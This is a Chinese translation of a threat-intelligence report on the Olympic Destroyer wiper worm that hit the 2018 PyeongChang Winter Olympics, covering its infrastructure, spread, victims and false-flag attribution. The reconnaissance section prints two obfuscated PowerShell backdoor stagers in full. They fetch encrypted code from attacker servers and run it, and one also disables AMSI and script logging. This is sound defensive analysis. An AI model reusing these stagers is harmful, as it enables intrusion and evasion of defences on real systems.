@@ -1,0 +1,443 @@
+# 迷雾中的Olympic Destroyer
+
+阅读量 **137709**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2018-03-12 10:09:11
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章原作者 GReAT，文章来源：securelist.com
+
+原文地址：<https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/>
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+## 一、前言
+
+今年的冬奥会在韩国平昌举行，开幕式后过几天，我们从多个合作伙伴那收到了几份秘密信息（TLP等级Red），内容涉及针对奥运基础设施的恶意攻击活动。快速分析这款恶意软件后，我们发现这是一款具备破坏功能、自我修改功能、密码窃取功能以及自主传播功能的恶意程序，不管从哪个角度来看，这听起来都是非常糟糕的一件事。
+
+根据媒体的[报道](https://www.wired.com/story/olympic-destroyer-malware-pyeongchang-opening-ceremony/)，平昌奥运会的组织者[证实](https://www.theguardian.com/sport/2018/feb/10/winter-olympics-investigating-if-technical-problems-were-cyber-attack)他们正在调查一起网络攻击事件，此次攻击导致IT系统在开幕式正式开始前处于瘫痪状态，显示器被关闭、Wi-Fi停止服务，同时奥运官网也无法正常工作，以致游客无法打印门票。我们还发现了针对其他公司的攻击活动，其任务是摧毁这些目标公司。
+
+## 二、恶意软件功能
+
+在攻击当天，与此次网络攻击相关的几个文件已经被上传到VirusTotal上，其他安全研究人员也及时跟踪到这一情况。在我们研究此次攻击事件时，思科的Talos团队[发布](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)了关于该恶意软件的简要说明（Talos通过未公开渠道获取了这款软件）。在Talos的博客中，他们标出了这款恶意软件与Netya（[Expetr/NotPetya](https://securelist.com/expetrpetyanotpetya-is-a-wiper-not-ransomware/78902/)）以及[BadRabbit](https://securelist.com/bad-rabbit-ransomware/82851/)（勒索软件）的一些相似之处。
+
+Talos的公开文章成功解除了这些信息所附带的TLP限制，现在相关信息已对外公布，大家可以通过各种渠道了解这些细节。然而，我们认为不应该那么早下结论，特别是此次攻击活动的追踪溯源问题。我们需要多花些时间，静下心来好好研究，继续挖掘恶意软件中的虚假标志以及争议信息。
+
+攻击所使用的主恶意软件模块是一款网络蠕虫，由多个组件组成，包括SysInternals中的合法PsExec工具、一些凭据窃取模块以及数据擦除模块（wiper）。从技术角度来看，恶意软件的目的是传播并启动wiper载荷，在接下来的60分钟内销毁远程网络共享上的文件。同时，主模块会从浏览器以及Windows存储数据中收集用户密码，生成包含历史凭据以及新收集凭据的新版蠕虫。新生成的蠕虫会推送到可达的本地网络主机上，利用收集到的凭据以及当前的用户权限，通过PsExec工具开展攻击。
+
+一旦wiper的运行时长达到了60分钟，它就会清除文件系统中的Windows事件日志、重置备份数据、删除卷影副本（shadow
+copy），也会禁用Windows启动菜单中的recovery选项、禁用系统上的所有服务然后重启电脑，同时恶意软件如果能访问网络共享，也会在60分钟后删除这些文件。恶意软件并没有使用任何本地持久化技术，也不包含避免重复感染的保护机制。顺便提一下，对于远程文件，只有1M大小的文件会被完全覆盖（用零填充），大文件只有前1K个字节会被零覆盖。本地文件并不会被删除，蠕虫也不会删除自己或者自己的组件。
+
+![](https://p1.ssl.qhimg.com/t01ad6311e7af9a7b97.png)
+
+图1. OlympicDestroyer各组件之间的关系
+
+## 三、侦察阶段
+
+已经有许多公司发表过Olympic
+Destroyer的相关研究文章，内容涉及攻击事件的追踪溯源、恶意软件功能以及传播方式，但还没有人发现这款恶意软件的启动方式以及具体来源，这一方面我们的运气不错，有点研究成果。
+
+从2017年12月以来，安全研究人员观察到有些钓鱼邮件样本中的MS
+Office文档被上传到VirusTotal上，这些钓鱼邮件都与冬奥会有关。文档内容不多，只包含一些乱码文本，让用户误以为文档编码存在问题，诱导用户按下“启用内容（Enable
+Content）”按钮。
+
+![](https://p2.ssl.qhimg.com/t01db590f23c4e44ba5.png)
+
+图2. 钓鱼邮件中的文档示例
+
+当受害者点击该按钮后，钓鱼文档会使用命令行启动`cmd.exe`，执行PowerShell脚本，最终在目标系统中植入后门。攻击目标是这种邮件攻击活动与Olympic
+Destroyer之间较为明显的唯一联系，然而我们发现这个文档与针对平昌的攻击事件存在各种联系，因此将这两起攻击事件关联在一起。
+
+在攻击事件调查过程中，我们的分析人员获得了官方授权，可以以管理员权限访问受攻击影响的某台服务器，这台服务器位于平昌的某家酒店内。我们对这台Windows服务器做了归类分析。受影响的公司也非常支持我们的工作，为我们提供了来自网关的网络连接日志。在这些条件下，我们确认恶意攻击流量来自于`131.255.*.*`这个IP地址，该地址归属地为阿根廷，承载了攻击有关的恶意命令以及控制服务器功能。被感染的主机会与这台服务器建立多个连接，服务器开放的端口如下所示：
+
+    
+    
+    443
+    4443
+    8080
+    8081
+    8443
+    8880
+    
+
+攻击者从保加利亚的某家销售公司那购买了这台阿根廷服务器，这家公司也为我们的调查研究提供了许多帮助。该公司表示，攻击者从挪威购买了这台服务器，使用的是Protomail邮箱账户。
+
+具体信息如下：
+
+    
+    
+    姓名： Simon ***
+    邮箱： simon***@protonmail.com
+    最近登录日期： 2018-02-07 16:09
+    登录IP： 82.102.*.* (Norway)
+    服务器购买日期： 2017-10-10
+    
+
+后面我们又进一步将这些信息与某个可疑的域名联系起来，该域名的注册地址以及电话号码归属于瑞典，具体信息如下：
+
+    
+    
+    域名 microsoft******[.]com
+    注册名： Elvis ****
+    邮箱： elvis***@mail.com
+    注册日期： 2017-11-28
+    
+
+2017年12月份，这个域名没有通过ICANN的邮箱验证，因此被暂停服务，在此之前，域名处于隐私保护状态。许多域名信息对外屏蔽，但我们可以看到该域名所使用的DNS服务器信息，了解到攻击者通过MonoVM购买了这个域名（MonoVM是支持比特币支付的VPS服务商）：
+
+    
+    
+    域名服务器： monovm.earth.orderbox-dns[.]com
+    域名服务器： monovm.mars.orderbox-dns[.]com
+    域名服务器： monovm.mercury.orderbox-dns[.]com
+    域名服务器： monovm.venus.orderbox-dns[.]com
+    
+
+域名服务器变更历史如下图所示：
+
+![](https://p1.ssl.qhimg.com/t0134f68ef8a0bf3994.png)
+
+图3. `microsoft*****.com`域名服务器的历史变更记录
+
+这个邮件地址是某个小型网络的联系地址，位于 **89.219.*.***
+这个大网段中，该网络的归属地为哈萨克斯坦，目前我们只能跟踪到这里。现在我们还不能透露完整信息，避免这个联系地址发生变动，希望大家能够理解这一点。我们已经将完整信息提供给执法部门以及订阅我们的APT情报服务的客户。
+
+为了管理位于阿根廷的这台服务器，`Simon
+***`使用了位于挪威境内的一个IP地址（`82.102.*.*`）。这个地址是NordVPN（<https://nordvpn.com/>）服务商所使用的网关地址，该服务商支持比特币支付，可以提供隐私保护的VPN服务。
+
+在以往的攻击活动中，我们也曾见过NordVPN这个名字。之前我们发现过攻击者在钓鱼邮件中用到了一份武器化的Word文档，当时的攻击目标也是冬奥会，文档中包含一些垃圾文本，这些文本看起来貌似源自于某个二进制对象（比如页面文件或者原始磁盘数据）。然而，这些随机数据中包含两个可读的文本字符串（如下图红色方框所示），这些字符串在文档中（文档的MD5值为`5ba7ec869c7157efc1e52f5157705867`）并没有什么特别含义：
+
+![](https://p5.ssl.qhimg.com/t01a3a7676261e59be9.png)
+
+图4. 钓鱼文档中出现的openvpn配置文件信息
+
+当然这个证据并不是特别充分，但还是能给我们提供一些线索，表明针对冬奥会的钓鱼攻击组织与推出Olympic
+Destroyer蠕虫的攻击者之间存在一定联系。此外，该文档中还包含一条PowerShell命令，与Olympic
+Destroyer受害者网络中发现的PowerShell后门非常相似。这两份代码的对比如下所示。
+
+如下列出的两份PowerShell脚本既可以用在武器化的文档中，也可以用作单独的后门。作为单独的无文件（fileless）后门，这两个脚本都采用了相同的工具来构建以及混淆处理，都使用了相似的URL结构，都在PowerShell中采用了RC4算法，也都将密钥通过base64编码后，嵌入cookie字段发送给服务器。
+
+针对韩国的钓鱼攻击所使用的PowerShell载荷如下所示：
+
+    
+    
+    (  gCi VariABLE:FzS3AV  ).”VaLUE”::”expecT100cOnTiNUe”=0;
+     ${wC}=^&NEW-ObjecT System.Net.Webclient;${u}=Mozilla/5.0 (Windows NT 6.1;WOW64; Trident/7.0; rv:11.0)like Gecko;
+     (  GCI VARiabLe:fZS3aV ).”vAlUe”::”seRVeRCeRTiFICaTEVALIDATIoNCALlbAck” = {${tRUE}};
+     ${wC}.”hEADERs”.Add.Invoke(User-Agent,${U});
+     ${WC}.”PROXy”=  ( variaBLe  (“fX32R”) -VAlUeO )::”DefaultWebProxy”;
+     ${wc}.”pRoxY”.”CREdENtials” =  ( GET-vaRiABle (‘hE7KU’)).”VAlue”::”dEFauLTNeTWOrkCREdENTIALs”;
+     ${K}=  $XNLO::”asCiI”.GetBytes.Invoke(5e2988cfc41d844e2114dceb8851d0bb);
+     ${R}=
+     {
+      ${D},${K}=${ArGs};
+      ${s}=0..255;0..255^|^&(‘%’)
+      {
+        ${j}=(${j}+${s}[${_}]+${k}[${_}%${K}.”couNt”])%256;
+        ${s}[${_}],${S}[${J}]=${s}[${J}],${S}[${_}]
+      };
+      ${d}^|^&(‘%’)
+      {
+        ${I}=(${I}+1)%256;
+        ${h}=(${H}+${s}[${I}])%256;
+        ${S}[${I}],${s}[${H}]=${s}[${H}],${S}[${I}];
+        ${_}-BxoR${S}[(${s}[${I}]+${S}[${H}])%256]}
+    };
+     ${Wc}.”hEadeRS”.Add.Invoke(cookie,session=ABWjqj0NiqToVn0TW2FTlHIAApw=);
+     ${SER}=https://minibo***[.]cl:443;
+     ${T}=/components/com_tags/controllers/default_tags.php;
+     ${dATa}=${Wc}.DownloadData.Invoke(${seR}+${T});
+     ${IV}=${DATA}[0..3];
+     ${dAta}=${DaTA}[4..${dAtA}.length];
+     -jOin[ChaR[]](^& ${R} ${DAtA} (${IV}+${K}))^|.IEX  &&SeT   RMN=ecHo InvoKe-expRESsIon  ([ENVirOnMeNt]::gETeNvIroNMENTvarIaBlE(‘svTI’,’procEsS’))  ^| pOWErshEll -NOnint  -wiNdOWSt hiddeN -NoEXiT  -NoprOFilE -ExECuTiONPOLIcy  bYpASs     –  && CMd.exE   /c%Rmn%
+    
+
+OlympicDestroyer受害者环境中发现的PowerShell载荷如下所示：
+
+    
+    
+    If($PSVERsIoNTAbLe.PSVeRsIon.MAJOR -Ge 3){$GPS=[ReF].ASSEmbly.GETTYPE(‘System.Management.Automation.Utils’).”GeTFie`Ld”(‘cachedGroupPolicySettings’,’N’+’onPublic,Static’).GEtVALUe($NulL);
+    If($GPS[‘ScriptB’+’lockLogging’]){$GPS[‘ScriptB’+’lockLogging’][‘EnableScriptB’+’lockLogging’]=0;
+    $GPS[‘ScriptB’+’lockLogging’][‘EnableScriptBlockInvocationLogging’]=0}ElSE{[ScriptBlOcK].”GeTFiE`Ld”(‘signatures’,’N’+’onPublic,Static’).SETValUE($NUlL,(New-ObJecT CoLLectIOnS.GeNeRIC.HAshSet[stRing]))}[ReF].AssEmbLY.GETTYPe(‘System.Management.Automation.AmsiUtils’)|?{$_}|%{$_.GEtField(‘amsiInitFailed’,’NonPublic,Static’).SEtVALue($nULL,$TRuE)};
+    };
+    [SYStem.NeT.SerVicePoinTMANAGeR]::EXPeCt100ConTINuE=0;
+    $wC=NeW-ObJect SySTem.NEt.WEBClIeNT;
+    $u=’Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko’;
+    $Wc.HEADErS.Add(‘User-Agent’,$u);
+    $wC.ProXY=[SYsTeM.NET.WeBREqUesT]::DEFAUltWebPROXY;
+    $wC.PROxY.CredentIAlS = [SYsTem.NEt.CRedeNTialCacHe]::DeFAuLTNeTwoRKCredeNtiAls;
+    $Script:Proxy = $wc.Proxy;
+    $K=[SysTEM.Text.ENcOding]::ASCII.GETBYTes(’94+K/L3OE?o@qRl>.:FPev7rtNb^|#im’);
+    $R=
+    {
+    $D,$K=$ARgs;
+    $S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.COuNt])%256;
+     $S[$_],$S[$J]=$S[$J],$S[$_]};
+     $D|%
+      {
+       $I=($I+1)%256;
+       $H=($H+$S[$I])%256;
+       $S[$I],$S[$H]=$S[$H],$S[$I];
+       $_-bxor$S[($S[$I]+$S[$H])%256]
+      }
+    };
+    $ser=’http://131.255.*.*:8081′;
+    $t=’/admin/get.php’;
+    $wc.HeAders.Add(“Cookie”,”session=zt8VX24Knnzen8pNvhPl1xJ2E5s=”);
+    $daTA=$WC.DownlOADDATA($ser+$t);
+    $iV=$DATa[0..3];
+    $datA=$dATa[4..$data.leNgth];
+    -joiN[CHAR[]](& $R $dAta ($IV+$K))|IEX
+    
+
+## 四、横向渗透
+
+除了使用网络蠕虫的自我复制功能以外，攻击者在执行破坏性恶意软件之前也会手动执行一些横向渗透操作。我们认为攻击者之所以这么做，是为了寻找更合适的位置来释放蠕虫。恶意软件通过PsExec以及窃取的凭据信息在目标网络内渗透、打开默认的meterpreter端口（TCP
+4444端口）、下载并运行后门载荷（meterpreter）。攻击者还会检查网络配置信息，可能是想搜寻连接到多个网络或者其他VPN链路的服务器，以进一步渗透可能与奥运会基础设施有关的邻近网络环境。
+
+在受此次攻击影响的滑雪度假酒店网络中，有一台主机启用了卡巴斯基实验室的系统监视器组件，该组件成功收集到攻击者在横向渗透过程中所遗留的一些蛛丝马迹。根据该主机的监测数据，攻击者进入系统的时间为2018年2月6日。攻击者用到了3种类型的PowerShell
+scriptlet，分别为TCP 4444端口启动器（opener）、ipconfig启动器（launcher）以及一个下载器（downloader）。
+
+收到这些监测数据后，我们构建了攻击者的活动时间线以及直方图，可以显示攻击者何时在系统上运行可执行文件，如下图所示：
+
+![](https://p3.ssl.qhimg.com/t0156df75cab1b83d36.png)
+
+图5. 攻击者在一天内的活跃情况（按小时分布）
+
+由此我们可以看到，在正常办公时间之外攻击者往往最为活跃（韩国标准时间，UTC+
+9），攻击者这么做可能是不想引起太大动静，也有可能这些时间刚好与他们的时区相符。
+
+## 五、蠕虫传播
+
+Olympic
+Destroyer是一款网络蠕虫，可以收集用户凭据以及主机名信息。新的数据会附加到现有数据的尾部。我们从不同网络中收集了多个蠕虫样本，利用这些样本重建了蠕虫的传播路径，找出了传播的源头（或者至少定位出最开始涉及到的主机名以及用户列表）。
+
+![](https://p5.ssl.qhimg.com/t01e361dad064255162.png)
+
+图6. Olympic Destroyer蠕虫传播路径
+
+我们根据提取出来的凭据列表、主机名以及服务器角色制作了上面这张图（服务器角色由服务器名称来判断）。可以看到至少有3个独立的区域可以传播蠕虫：Atos.net公司、滑雪度假酒店以及`Pyeongchang2018.com`服务器。
+
+在某个时间点，带有凭据信息的恶意软件样本被上传到VirusTotal上，从而被安全研究人员发现。安全研究人员在沙箱环境中运行蠕虫样本，并将新版样本再次上传到VirusTotal上。VT上已经存在多个样本，这些样本包含沙箱主机的凭据信息。尽管如此，这款网络蠕虫的发源地并不是这些节点，而是来自于前面提到的几个区域中的某一环。
+
+## 六、受害者
+
+渔叉式钓鱼邮件的攻击目标是冬奥会官方合作伙伴的网络。攻击者可能通过官方网站找到了这些合作伙伴公司的名称以及域名，收集已知的邮件地址，然后开始使用渔叉式钓鱼邮件轰炸这些目标。
+
+这些攻击文档中，有一份于2017年12月29日从韩国上传至VT，该文档位于某个邮件内（哈希值为`6b728d2966194968d12c56f8e3691855`）。邮件发送方模仿了韩国NCTC（国家反恐中心）的邮件地址，所使用的服务器IP归属地为新加坡。
+
+![](https://p0.ssl.qhimg.com/t012a595713dfdb172f.png)
+
+图7. 伪造的发送方地址
+
+这封邮件看上去会发送给`icehockey[@pyeongchang2018](https://github.com/pyeongchang2018
+"@pyeongchang2018")[.]com`，然而，真正的攻击目标非常广泛，如下所示：
+
+![](https://p5.ssl.qhimg.com/t013dd6fe148d33d78b.png)
+
+攻击者在搜索以这些域名结尾的邮箱地址时似乎采取了广撒网的策略，并没有特别精确。使用诸如`sk.com`或者`kt.com`之类的短域名并不是个好主意，以`sk.com`以及`kt.com`为域名结尾的某些完全不相关的公司同样收到了钓鱼邮件，很多人没有注意到这一点，这些公司的域名如下。
+
+    
+    
+    krovy-sk.com（斯洛伐克的木材公司）
+    okc-sk.com（加拿大采矿相关公司）
+    bcel-kt.com（老挝的财务公司）
+    kuhlekt.com（澳大利亚的软件公司）
+    wertprojekt.com（德国的房地产公司）
+    
+
+基于我们发现的所有证据，此次攻击活动似乎成功破坏了如下网络：
+
+1、负责滑雪场自动化设施的软件厂商
+
+2、韩国境内的两家滑雪胜地酒店
+
+3、总部位于法国的IT服务提供商（Atos.net）
+
+4、某些商业相关网络
+
+由于这是一款网络蠕虫，可以借助Windows网络共享进行传播，因此肯定会造成一些损失。澳大利亚的某个受害者组织将释放器（dropper）文件上传到了VT上，我们从中提取出了恶意软件所窃取的凭据，其中涉及到的主机名为ATVIES2BQA。这个字符串乍看之下像是一个随机的字符序列，但我们推测AT代表的是主机的国别代码（奥地利），后面的“VIES”为组织名，随后是用于唯一标识某主机的随机字符。根据OSINT（公开源情报）所提供的信息，奥地利只有一个大型组织与这个名称相匹配：VAT
+Information Exchange
+System（增值税信息交换系统，整个欧盟都在使用）。VIES是欧盟委员会拥有的搜索引擎。被突破的要么是Atos的一台主机，该主机承担与奥地利VIES通信的任务；要么是奥地利的VIES系统，恶意软件的网络传播行为的确给该系统造成了一些损失。
+
+但根据我们的调查结果，蠕虫攻击主要爆发在韩国冬季度假胜地的一家酒店。酒店并没有往VT网站上传任何样本，这也是攻击情况不明的原因所在。我们猜想韩国境内受攻击影响的其他许多公司也采取了类似的操作，这种情况使我们无法完全窥探被攻击的基础设施的完整规模。
+
+虽然我们无法标出酒店的完整攻击链路，但可以确认的是，位于平昌滑雪场的某家酒店的确遭受到了攻击。这个度假村虽然与奥运会相距很近，但并不是举办比赛的官方园区。然而我们还是可以把它当成奥运会周边基础设施的一部分，它为许多客人提供服务，其中还包括参加奥运比赛的运动健儿。采访业主后，我们发现恶意软件成功禁用了滑雪门以及滑雪升降梯，这些设施由受攻击影响的某台服务器负责维护。我们的分析表明，这次攻击是攻击者精心准备的。攻击者刻意选择了这个滑雪胜地的自动化服务器作为破坏性蠕虫的传播源头。这个服务器可以成为网络环境中的“零号病人（patient-zero）”。攻击者所选择的攻击时间点也非常精准，选在开幕式前几个小时，使蠕虫能尽可能传播到网络深处，对基础设施造成影响，给依赖这些设施的人带来最大程度的不便。事实上，攻击者的目的是让蠕虫攻击事件成为一个新闻热点话题。
+
+## 七、追踪溯源迷雾
+
+思科Talos研究人员在公布的[博客](https://blog.talosintelligence.com/2018/02/olympic-destroyer.html)中指出，Olympic
+Destroyer使用了类似于BadRabbit以及NotPetya的技术来重置事件日志并删除备份数据。虽然攻击者为了实现类似的效果采用了相似的技术，但编写的具体代码在语法上存在许多差异。攻击者并没有简单地复制粘贴代码，并且许多安全博客之前已经公开讨论过相关命令行，如果任何人有需要，都可以直接利用之前公开的研究成果。
+
+![](https://p5.ssl.qhimg.com/t01d466263b6b5c2a8c.png)
+
+图8. Olympic Destroyer以及NotPetya部分代码对比（清除事件日志以及禁用系统恢复）
+
+在Talos公开研究成果后，IntezerLabs这家以色列公司也发表了一则推文，他们发现此次攻击与中国的APT组织有关。
+
+![](https://p0.ssl.qhimg.com/t01b515b819e617a236.png)
+
+图9. 2018年2月12日IntezerLabs公布此次攻击与中国的APT组织有关
+
+IntezerLabs发布了一篇[博客](http://www.intezer.com/2018-winter-cyber-olympics-code-similarities-cyber-attacks-pyeongchang/)，介绍了利用他们内部的恶意软件相似性分析技术所得到的一些研究成果。
+
+几天之后，许多媒体开始[报道](https://www.scmagazineuk.com/2018-winter-olympics-hit-with-destroyer-malware-during-opening-ceremony/article/743928/)，认为俄罗斯的APT组织有潜在的动机来发动攻击：“在2017年11月和12月期间，Crowdstrike
+Intelligence观察到了针对国际体育部门的凭据窃取攻击，认为此次攻击活动的幕后主使者为俄罗斯的黑客组织Fancy Bear……”。
+
+另一方面，Crowdstrike的情报副总裁Adam
+Meyers则在某次[采访](https://www.scmagazineuk.com/2018-winter-olympics-hit-with-destroyer-malware-during-opening-ceremony/article/743928/)中称：“现在没有证据表明Fancy
+Bear与针对奥运会的攻击事件有关”。
+
+然而几星期之后，华盛顿邮报再次提及俄罗斯的攻击行为。华盛顿邮报引用了“两名匿名美国官员”的消息，[声称](https://www.washingtonpost.com/world/national-security/russian-spies-hacked-the-olympics-and-tried-to-make-it-look-like-north-korea-did-it-us-officials-say/2018/02/24/44b5468e-18f2-11e8-92c9-376b4fe57ff7_story.html)俄罗斯军事间谍是冬奥会攻击事件的幕后黑手。不幸的是，基于匿名消息源的这类文章并没有包含可以验证的信息，也没有提供真正的答案，这些文章的唯一作用就是传播谣言。
+
+微软的安全团队似乎也被这款恶意软件玩得团团转，他们的内部检测机制认为攻击中可能用到了EternalRomance漏洞（MS17-010）。
+
+![](https://p5.ssl.qhimg.com/t01d69c8ab3a3b5140a.png)
+
+图10. 微软安全团队认为Olympic Destroyer中存在EternalRomance漏洞利用技术
+
+几天之后，由于这些消息没有得到确认，微软收回了前面发表的言论。
+
+![](https://p0.ssl.qhimg.com/t0145e4273037e8e5e5.png)
+
+图11. 微软安全团队在后续推文中收回了先前的声明
+
+随后我们向我们的APT情报订阅客户推送了一份调查取证报告，认为此次攻击事件的追踪溯源是非常复杂的一件事情（如果想了解详细信息请联系intelreports@kaspersky.com），第二天思科Talos团队决定重新检查Olympic
+Destroyer，对外公布了相似的调查结论。我们非常赞同Talos的这篇分析[文章](https://blog.talosintelligence.com/2018/02/who-wasnt-responsible-for-olympic.html)，在代码对比方面我们得到了非常相似的结论。
+
+此外，Talos研究人员指出，恶意软件在操作过程中用到了`evtchk.txt`这个文件名作为虚假特征，这个特征与BlueNoroff/Lazarus在2016年针对孟加拉国的SWIFT攻击事件中所使用的文件名特征（`evtdiag.exe`、`evtsys.exe`以及`evtchk.bat`）非常相似。
+
+Recorded
+Future认为不应该把这次攻击事件归结到任何攻击者；然而，他们[声称](https://www.recordedfuture.com/olympic-destroyer-malware/)这款恶意软件与BlueNoroff/Lazarus
+LimaCharlie恶意软件加载器之间存在相似性，而大家认为这些恶意软件与朝鲜攻击者有千丝万缕的关系。
+
+无法否认的是，恶意软件部分代码与Lazarus的代码非常相似。Olympic
+Destroyer中使用的wiper模块（MD5：`3c0d740347b0362331c882c2dee96dbf`）与Bluenoroff（MD5：`5d0ffbc8389f27b0649696f0ef5b3cfe`）中擦除文件的代码非常相似。
+
+![](https://p4.ssl.qhimg.com/t01fb8fea4bdd20618c.png)
+
+图12. 擦除模块的代码（左图：Bluenoroff工具，右侧：OlympicDestroyer）
+
+Lazarus与Olympic
+Destroyer的相似度也很高。这两个攻击组织使用了相同的技术在内存中解密攻击载荷，解密密码同样来自于命令行参数。因为Lazarus的恶意软件加载器中包含一些默认的C2信息，为了避免被逆向分析，Lazarus使用这种技术来保护自己的后门模块。
+
+尽管这两款恶意软件方法上有些相似，但用法上却有较大的差别：
+
+1、Lazarus所使用的字母数字密码长度较长且较为可靠（30多个字符），Olympic Destroyer只使用了一个非常简单的密码：“123”。
+
+2、Lazarus从来没有将保护攻击载荷的密码硬编码到恶意软件中，而Olympic
+Destroyer则会采用硬编码方案（事实上没有其他可选方案，因为蠕虫必须能够自行传播并自主运行）。这也就是为什么在网络蠕虫中使用密码保护的攻击载荷是一种比较荒谬的想法，考虑到Lazarus组织之前的TTP（Tactics,
+Techniques and Procedures，战术、技术以及过程）特征，我们认为他们不大可能会采用类似的技术。
+
+考虑到金正恩的胞妹也会出席平昌冬奥会开幕式，我们认为朝鲜参与此次攻击事件的可能性看起来不大。根据我们的调查结果，攻击事件发生在2018年2月9日开幕式之前。
+
+接下来我们的发现让我们自己都大吃一惊。利用内部的恶意软件相似性系统，我们发现Olympic
+Destroyer与Lazarus组织存在一种独特的关联性。大家都知道，可执行文件中带有一些代码开发环境特征（即Rich
+Header），某些情况下可以用来作为指纹信息识别恶意软件开发者以及相关工具。在卡巴斯基实验室对Olympic Destroyer
+wiper样本的分析过程中，这个“指纹信息”与之前已知的Lazarus恶意软件组件匹配程度达到了100%，并且完全没有与卡巴斯基实验室先前掌握的任何无害或者恶意文件有交集。
+
+然而这款恶意软件在动机方面以及其他方面与Lazarus的TTP特征并不一致，这也促使我们某些研究人员以怀疑的态度重新审视这个稀罕物。再次仔细检查这些特征、手动验证每个功能后，我们发现这些特征与实际的代码并不匹配。此时我们终于明白，攻击者伪造了这些特征，使其能够与Lazarus组织的指纹完美匹配。考虑到在恶意软件分析和追踪溯源方面人们对这一领域尚未深入挖掘，我们在另一篇[博客](https://securelist.com/the-devils-in-the-rich-header/84348/)中专门介绍了我们的分析证明过程，提供了更加深入的技术细节。
+
+我们还注意到恶意软件中存在带有Rich
+Header信息的wiper模块，该模块从法国受害者（Atos）网络上传到VirusTotal上。模块的编译时间为2018-02-09
+10:42:19，此时距离平昌滑雪场遭受攻击后差不多2个小时。我们不清楚攻击出现了什么问题，但看起来攻击者似乎急于修改蠕虫的wiper组件，让其能够立即禁用系统服务并重启主机，而不需要等待60分钟。由于距离官方开幕式典礼只剩下几分钟，攻击者似乎想立刻看到攻击成果。
+
+将上述所有情况考虑在内，我们发现攻击者故意在恶意软件中放置了许多非常复杂的虚假特征，向分析人员释放烟雾弹，让他们误以为在犯罪现场缴获了枪口冒烟的凶器，然而却与事实的真相渐行渐远。
+
+## 八、总结
+
+现在我们可以得出什么结论呢？这与背后攻击者的聪明程度密切相关
+
+如果Lazarus是最聪明的组织，那么他们完全可以构造一个复杂的虚假标志，复杂到让大家难以证实，只有更复杂的分析过程才能发现这是伪造的标志。然而，研究人员的技术复杂程度是攻击者难以衡量的一个因素。复杂度肯定会降低可靠性，无法保证一切都按原计划执行。另外，Lazarus没有明显的动机来发起这次攻击，更何况此次攻击与他们的TPP并不相符。
+
+说到TTP，我们发现攻击者使用过NordVPN以及MonoVM托管服务，这两种服务都支持比特币支付，因而像是为APT攻击者量身定做的服务。作为众所周知的俄罗斯攻击组织，Sofacy
+APT之前曾使用过这些服务以及其他TTP。我们在一年前发表了关于Lazarus
+APT组织的研究报告，指出Lazarus组织在针对全世界银行的攻击活动中使用过虚假标志，将线索引向俄罗斯组织。此次事件是否是俄罗斯Sofacy组织的打击报复，还是有人想披着Sofacy的外壳来搞些事情？事情真相尚未揭晓，我们还没有得到明确的答案。
+
+在此次事件中，关于攻击者的真实动机仍是开放性问题。我们知道攻击者拥有受害网络的管理员账户。如果删除备份数据、销毁所有的本地数据，攻击者可以轻松破坏掉奥运会的基础设施。然而攻击者还是“手下留情”了，他们擦除了Windows共享上的文件、重置事件日志、删除备份数据、禁用Windows服务、使系统无法正常重启。当我们考虑到其他攻击组织以及恶意软件的TTP特征、故意引入的虚假标志以及较好的OPSEC（操作安全），想理解攻击者的意图可能会带出更多问题。
+
+根据这些信息，我们可以猜测此次攻击事件背后的动机，包括如下几种可能性：
+
+1、通过安全人员无法掌握的秘密通信向世人展示攻击者的实力或者技术水平。在高度机密的政治谈判中，全面且具备高度破坏性的网络攻击行为往往能带来更多的话语权。
+
+2、测试破坏性蠕虫的能力，但同时限制了蠕虫的影响力，避免引起各种调查人员以及普罗大众的过度关注（因为攻击中可能出现人为错误或者操作失误）。
+
+3、通过虚假标志让情报研究人员陷入迷宫，观察研究人员公布的结论，学习如何实现完美的虚假标志。
+
+如果你在思索为何恶意软件所附带的擦除模块不能擦除自身组件，那么最后一种可能性也就能说得通，因为作者希望别人能够发现这款恶意软件。
+
+对于实力强大的攻击者，如果他们想学习如何可靠地构造虚假标志、如何误导研究人员的追踪溯源分析，那么他们最终能够完全瓦解对其的追踪溯源。但这种高超技术需要现实试验的不断磨练。
+
+我们认为这次精心策划的Olympic
+Destroyer攻击事件将在未来的APT研究中扮演重要的角色。虽然此次攻击并没有完全破坏平昌冬奥会，但同时给韩国以及欧洲造成了影响。最重要的是，攻击事件给追踪溯源过程带来了极大的困扰，降低人们对情报研究成果的信任度。
+
+从此次攻击事件中，致力于威胁情报的人们都可以得到一个教训，那就是不要着急追踪溯源。追踪溯源是一个非常微妙的问题，应该谨慎处理。在这个行业中，我们不应该牺牲研究的准确性，却以投机的方式来推动业务进展。
+
+## 九、Olympic Destroyer可执行文件
+
+样本散列如下：
+
+    
+    
+    0311CEC923C57A435E735E106517797F
+    104ECBC2746702FA6ECD4562A867E7FB
+    12668F8D072E89CF04B9CBCD5A3492E1
+    19C539FF2C50A0EFD52BB5B93D03665A
+    221C6DB5B60049E3F1CDBB6212BE7F41
+    3514205D697005884B3564197A6E4A34
+    3C0D740347B0362331C882C2DEE96DBF
+    47E67D1C9382D62370A0D71FECC5368B
+    4C8FA3731EFD2C5097E903D50079A44D
+    4F43F03783F9789F804DCF9B9474FA6D
+    51545ABCF4F196095ED102B0D08DEA7E
+    52775F24E230C96EA5697BCA79C72C8E
+    567D379B87A54750914D2F0F6C3B6571
+    5778D8FF5156DE1F63361BD530E0404D
+    583F05B4F1724ED2EBFD06DD29064214
+    58DD6099F8DF7E5509CEE3CB279D74D5
+    59C3F3F99F44029DE81293B1E7C37ED2
+    64AA21201BFD88D521FE90D44C7B5DBA
+    65C024D60AF18FFAB051F97CCDDFAB7F
+    68970B2CD5430C812BEF5B87C1ADD6EA
+    6E0EBEEEA1CB00192B074B288A4F9CFE
+    7C3BF9AB05DD803AC218FC7084C75E96
+    83D8D40F435521C097D3F6F4D2358C67
+    86D1A184850859A6A4D1C35982F3C40E
+
+本文翻译自securelist.com [原文链接](https://securelist.com/olympicdestroyer-is-here-to-trick-the-industry/84295/)。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **興趣使然的小胃** 原创发布
+
